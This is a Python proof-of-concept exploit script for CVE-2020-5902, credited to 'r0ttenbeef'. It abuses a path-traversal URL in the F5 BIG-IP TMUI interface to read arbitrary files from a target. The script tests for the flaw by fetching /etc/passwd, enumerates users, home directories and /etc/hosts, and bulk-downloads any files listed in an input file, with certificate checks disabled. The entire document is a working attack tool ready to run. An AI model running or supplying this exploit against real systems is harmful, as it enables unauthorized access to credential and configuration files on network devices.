#!/usr/bin/python3
import requests
import json
import re
import sys
import os
from optparse import OptionParser
from pathlib import Path

requests.packages.urllib3.disable_warnings()

def get_req(lfile):
    url = options.url
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0",
        "Accept": "*/*"
            }
    payload = "/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName="
    
    req = requests.get(url + payload + lfile, headers=headers, verify=False, timeout=100)
    
    return req

def get_info():
    passwd = json.loads(get_req("/etc/passwd").text)['output']
    for user in passwd.splitlines():
        if "/bin/bash" in user:
            users = re.findall("^[A-Za-z0-9].*?[^:]+", user)[0]
            if users == "root":
                print("[+]User: " + users)
            else:
                home_dir = re.findall("\/home\/[A-Za-z0-9].*?[^:]+", user)[0]
                print("[+]User: " + users + " : " + home_dir)
    
    hosts = json.loads(get_req("/etc/hosts").text)['output']
    for host in hosts.splitlines():
        if "#" not in host:
            print("[+]Host: " + host)

def save_file(ftxt):
    file_txt = open(ftxt, 'r')
    for file_path in file_txt:
        lfile = file_path.splitlines()[0]
        dir_name = str(Path(lfile).parent)
        file_name = str(Path(lfile).name)
        download_path = os.getcwd() + "/" + dir_name
        try:
            os.makedirs(download_path)
        except:
            None
        try:
            f = open(download_path + "/" + file_name, "+w")
            print("[*]Saving file: " + lfile)
            content = json.loads(get_req(lfile).text)['output']
            f.write(content)
            f.close()
        except:
            print("[!]Unable to download " + lfile)
            os.remove(download_path + "/" + file_name)
            pass

def main():
    check_vuln = get_req("/etc/passwd")
    print("[*]Status: " + str(check_vuln.status_code))
    try:
        resp = json.loads(check_vuln.text)
        if 'root' in resp['output']:
            print("[+]Target is vulnerable!")
        if options.filename:
            req_file = get_req(options.filename)
            print(json.loads(req_file.text)['output'])
        elif options.info:
             get_info()
        elif options.download:
             save_file(options.download)
        else:
            print("[-]Target not vulnerable!")
            sys.exit(2)
    except:
        None

if __name__ == '__main__':
    print("POC CVE-2020-5902 - r0ttenbeef")
    parser = OptionParser(usage="%prog [options]")
    parser.add_option("-u", "--url", dest="url", default=None, help="specify target url EX:http://100.200.300.10/")
    parser.add_option("-i", "--info", dest="info", action='store_true', help="grap some informations")
    parser.add_option("-f", "--file", dest="filename", default=None, help="specify the local file EX:/etc/passwd")
    parser.add_option("-d", "--download", dest="download", default=None, help="download the local files from a file list EX:files.txt")
    (options, args) = parser.parse_args()
    if options.url == None:
        parser.error("[-]Need to specify the target URL, use -h, --help for help menu.")
        sys.exit(1)
    main()
